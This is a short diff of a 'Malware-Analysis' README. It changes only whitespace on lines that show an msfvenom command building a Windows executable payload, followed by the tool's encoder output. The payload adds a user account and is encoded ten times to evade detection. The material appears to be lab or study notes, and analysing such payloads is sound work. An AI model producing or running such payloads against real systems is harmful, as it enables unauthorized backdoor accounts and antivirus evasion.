@@ -1,10 +1,10 @@
 # Malware-Analysis
 
-root@kali64:~# msfvenom -p windows/adduser user=testuser1 pass=Test@321 -e x86/shikata_ga_nai -i 10 -f exe -o ~/testadd10.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-Found 1 compatible encoders
-Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
+root@kali64:~# msfvenom -p windows/adduser user=testuser1 pass=Test@321 -e x86/shikata_ga_nai -i 10 -f exe -o ~/testadd10.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload  
+Found 1 compatible encoders  
+Attempting to encode payload with 10 iterations of x86/shikata_ga_nai  
 x86/shikata_ga_nai succeeded with size 303 (iteration=0)
 x86/shikata_ga_nai succeeded with size 330 (iteration=1)
 x86/shikata_ga_nai succeeded with size 357 (iteration=2)
